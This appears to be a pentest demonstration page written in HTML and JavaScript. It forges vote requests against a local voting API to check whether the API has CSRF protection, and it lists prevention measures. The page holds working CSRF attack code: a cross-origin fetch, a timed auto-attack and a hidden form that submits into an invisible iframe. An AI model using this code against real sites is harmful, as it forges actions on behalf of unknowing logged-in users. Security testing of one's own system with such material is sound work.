<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>üé£ CSRF Attack Demonstration - Pentest</title>
  <style>
    body {
      font-family: 'Monaco', 'Courier New', monospace;
      background: #1a1a1a;
      color: #00ff00;
      padding: 20px;
      max-width: 900px;
      margin: 0 auto;
    }
    .container {
      border: 2px solid #00ff00;
      padding: 20px;
      border-radius: 8px;
      background: #0d0d0d;
    }
    h1 {
      color: #ff4444;
      text-align: center;
      font-size: 24px;
      margin-bottom: 10px;
    }
    .warning {
      background: #ff4444;
      color: #fff;
      padding: 15px;
      border-radius: 5px;
      margin: 20px 0;
      font-weight: bold;
    }
    .info {
      background: #333;
      padding: 15px;
      border-radius: 5px;
      margin: 15px 0;
      border-left: 4px solid #00ff00;
    }
    .form-group {
      margin: 15px 0;
    }
    label {
      display: block;
      margin-bottom: 5px;
      color: #00ff00;
    }
    input, button {
      width: 100%;
      padding: 10px;
      margin: 5px 0;
      border-radius: 4px;
      border: 1px solid #00ff00;
      background: #0d0d0d;
      color: #00ff00;
      font-family: inherit;
    }
    button {
      background: #ff4444;
      color: white;
      cursor: pointer;
      font-weight: bold;
      transition: background 0.3s;
    }
    button:hover {
      background: #cc0000;
    }
    .result {
      margin-top: 20px;
      padding: 15px;
      border-radius: 5px;
      display: none;
    }
    .success {
      background: #00ff0022;
      border: 1px solid #00ff00;
    }
    .error {
      background: #ff000022;
      border: 1px solid #ff4444;
      color: #ff4444;
    }
    pre {
      background: #000;
      padding: 10px;
      border-radius: 4px;
      overflow-x: auto;
      border: 1px solid #00ff00;
    }
    .auto-attack {
      background: #ff000022;
      border: 2px solid #ff4444;
      padding: 15px;
      margin: 20px 0;
      border-radius: 5px;
    }
    code {
      color: #ffff00;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>üé£ CSRF Attack Demonstration</h1>
    <div class="warning">
      ‚ö†Ô∏è PENTEST ONLY: This page demonstrates Cross-Site Request Forgery vulnerability.
      Use only for authorized security testing on your own systems!
    </div>

    <div class="info">
      <h3>üîç What is CSRF?</h3>
      <p>
        Cross-Site Request Forgery (CSRF) l√† m·ªôt l·ªó h·ªïng cho ph√©p attacker th·ª±c thi
        c√°c h√†nh ƒë·ªông kh√¥ng mong mu·ªën tr√™n web application m√† victim ƒëang ƒëƒÉng nh·∫≠p.
      </p>
      <p>
        Trong tr∆∞·ªùng h·ª£p n√†y, ch√∫ng ta s·∫Ω test xem voting system c√≥ th·ªÉ b·ªã exploit
        b·ªüi CSRF attack hay kh√¥ng.
      </p>
    </div>

    <div class="info">
      <h3>üìã Attack Scenario:</h3>
      <ol style="margin-left: 20px;">
        <li>Victim truy c·∫≠p trang web ƒë·ªôc h·∫°i n√†y (ho·∫∑c click v√†o link trong email)</li>
        <li>Trang n√†y t·ª± ƒë·ªông g·ª≠i vote request ƒë·∫øn voting system</li>
        <li>N·∫øu kh√¥ng c√≥ CSRF protection, vote s·∫Ω ƒë∆∞·ª£c t·∫°o th√†nh c√¥ng</li>
        <li>Victim kh√¥ng bi·∫øt l√† m√¨nh ƒë√£ vote cho infrastructure n√†o</li>
      </ol>
    </div>

    <div class="form-group">
      <label for="apiUrl">üéØ Target API URL:</label>
      <input
        type="text"
        id="apiUrl"
        value="http://localhost:3000/api/infrastructures/[INFRASTRUCTURE-ID]/vote"
        placeholder="http://localhost:3000/api/infrastructures/{id}/vote"
      >
      <small style="color: #888;">Replace [INFRASTRUCTURE-ID] with actual ID</small>
    </div>

    <div class="form-group">
      <label for="voterName">üë§ Voter Name (will be sent automatically):</label>
      <input
        type="text"
        id="voterName"
        value="CSRF Victim"
        placeholder="Voter Name"
      >
    </div>

    <div class="form-group">
      <label for="voterEmail">üìß Voter Email (will be sent automatically):</label>
      <input
        type="email"
        id="voterEmail"
        value="victim@example.com"
        placeholder="victim@example.com"
      >
    </div>

    <button onclick="executeCSRFAttack()">
      üöÄ Execute Manual CSRF Attack
    </button>

    <div class="auto-attack">
      <h3>‚ö° Auto CSRF Attack (Silent Mode)</h3>
      <p>
        Trong th·ª±c t·∫ø, CSRF attack th∆∞·ªùng ƒë∆∞·ª£c th·ª±c hi·ªán t·ª± ƒë·ªông v√† im l·∫∑ng khi
        victim load trang. B·∫°n c√≥ th·ªÉ test b·∫±ng c√°ch uncomment ƒëo·∫°n code JavaScript
        ·ªü cu·ªëi file n√†y.
      </p>
      <label>
        <input type="checkbox" id="autoAttack"> Enable auto-attack on page load
      </label>
      <p style="color: #ff4444; margin-top: 10px;">
        ‚ö†Ô∏è Khi enabled, page s·∫Ω t·ª± ƒë·ªông g·ª≠i vote request khi load!
      </p>
    </div>

    <div id="result" class="result"></div>

    <div class="info" style="margin-top: 30px;">
      <h3>üõ°Ô∏è How to Prevent CSRF:</h3>
      <pre><code>// 1. Implement CSRF tokens
// 2. Validate Origin/Referer headers
// 3. Use SameSite cookie attribute
// 4. Require re-authentication for sensitive actions
// 5. Use framework built-in CSRF protection (Next.js middleware)</code></pre>
    </div>

    <div class="info">
      <h3>üìä Expected Results:</h3>
      <p><strong>If Vulnerable:</strong></p>
      <ul style="margin-left: 20px;">
        <li>‚úÖ Vote is created successfully</li>
        <li>‚úÖ HTTP 201 response</li>
        <li>‚úÖ No CORS error (or CORS allows any origin)</li>
        <li>üî¥ System is VULNERABLE to CSRF</li>
      </ul>
      <p><strong>If Protected:</strong></p>
      <ul style="margin-left: 20px;">
        <li>‚ùå CSRF token validation fails</li>
        <li>‚ùå Origin/Referer validation fails</li>
        <li>‚ùå HTTP 403 Forbidden</li>
        <li>üü¢ System is PROTECTED against CSRF</li>
      </ul>
    </div>
  </div>

  <script>
    async function executeCSRFAttack() {
      const apiUrl = document.getElementById('apiUrl').value;
      const voterName = document.getElementById('voterName').value;
      const voterEmail = document.getElementById('voterEmail').value;
      const resultDiv = document.getElementById('result');

      if (apiUrl.includes('[INFRASTRUCTURE-ID]')) {
        resultDiv.className = 'result error';
        resultDiv.style.display = 'block';
        resultDiv.innerHTML = '‚ùå Please replace [INFRASTRUCTURE-ID] with actual ID!';
        return;
      }

      resultDiv.style.display = 'block';
      resultDiv.className = 'result';
      resultDiv.innerHTML = '‚è≥ Executing CSRF attack...';

      try {
        const response = await fetch(apiUrl, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            voterName: voterName,
            voterEmail: voterEmail
          })
        });

        const data = await response.json();

        if (response.ok) {
          resultDiv.className = 'result success';
          resultDiv.innerHTML = `
            <h3>üî¥ CRITICAL: CSRF Attack Successful!</h3>
            <p><strong>Status:</strong> ${response.status} ${response.statusText}</p>
            <p><strong>Vote Created:</strong> YES</p>
            <p><strong>Total Votes:</strong> ${data.totalVotes}</p>
            <p><strong>Vote ID:</strong> ${data.vote.id}</p>
            <br>
            <p style="color: #ff4444;"><strong>‚ö†Ô∏è VULNERABILITY CONFIRMED:</strong></p>
            <ul style="margin-left: 20px;">
              <li>No CSRF token validation</li>
              <li>No Origin/Referer checking</li>
              <li>Cross-origin requests are allowed</li>
              <li>System is vulnerable to CSRF attacks</li>
            </ul>
            <br>
            <p><strong>üí° Recommendation:</strong> Implement CSRF protection immediately!</p>
            <br>
            <details>
              <summary>Response Data (click to expand)</summary>
              <pre>${JSON.stringify(data, null, 2)}</pre>
            </details>
          `;
        } else {
          resultDiv.className = 'result error';
          resultDiv.innerHTML = `
            <h3>‚ùå Attack Failed</h3>
            <p><strong>Status:</strong> ${response.status} ${response.statusText}</p>
            <p><strong>Error:</strong> ${data.error || 'Unknown error'}</p>
            <br>
            <p>This could mean:</p>
            <ul style="margin-left: 20px;">
              <li>CSRF protection is enabled (GOOD)</li>
              <li>Invalid infrastructure ID (check the ID)</li>
              <li>Server error (check server logs)</li>
            </ul>
            <br>
            <details>
              <summary>Response Data (click to expand)</summary>
              <pre>${JSON.stringify(data, null, 2)}</pre>
            </details>
          `;
        }
      } catch (error) {
        resultDiv.className = 'result error';
        resultDiv.innerHTML = `
          <h3>‚ùå Network Error</h3>
          <p><strong>Error:</strong> ${error.message}</p>
          <br>
          <p>Possible reasons:</p>
          <ul style="margin-left: 20px;">
            <li><strong>CORS blocking</strong> - Server doesn't allow cross-origin requests (GOOD for security)</li>
            <li><strong>Network error</strong> - Server is not running or unreachable</li>
            <li><strong>Invalid URL</strong> - Check the API endpoint</li>
          </ul>
          <br>
          <p><strong>Note:</strong> CORS errors still mean the request was sent!
          Check server logs to see if vote was created.</p>
        `;
      }
    }

    // Auto-attack on page load (uncomment to enable)
    window.addEventListener('load', function() {
      const autoAttackCheckbox = document.getElementById('autoAttack');

      autoAttackCheckbox.addEventListener('change', function() {
        if (this.checked) {
          alert('‚ö†Ô∏è Auto-attack enabled! Page will execute CSRF attack in 3 seconds...');
          setTimeout(() => {
            console.log('üéØ Executing automatic CSRF attack...');
            executeCSRFAttack();
          }, 3000);
        }
      });
    });

    // Alternative: Using hidden form (traditional CSRF method)
    function createHiddenFormAttack() {
      const apiUrl = document.getElementById('apiUrl').value;
      const voterName = document.getElementById('voterName').value;
      const voterEmail = document.getElementById('voterEmail').value;

      // Note: This won't work with JSON APIs, but demonstrates the concept
      const form = document.createElement('form');
      form.method = 'POST';
      form.action = apiUrl;
      form.target = 'csrf-frame';

      const nameInput = document.createElement('input');
      nameInput.type = 'hidden';
      nameInput.name = 'voterName';
      nameInput.value = voterName;

      const emailInput = document.createElement('input');
      emailInput.type = 'hidden';
      emailInput.name = 'voterEmail';
      emailInput.value = voterEmail;

      form.appendChild(nameInput);
      form.appendChild(emailInput);
      document.body.appendChild(form);

      // Create hidden iframe
      const iframe = document.createElement('iframe');
      iframe.name = 'csrf-frame';
      iframe.style.display = 'none';
      document.body.appendChild(iframe);

      form.submit();
    }
  </script>
</body>
</html>
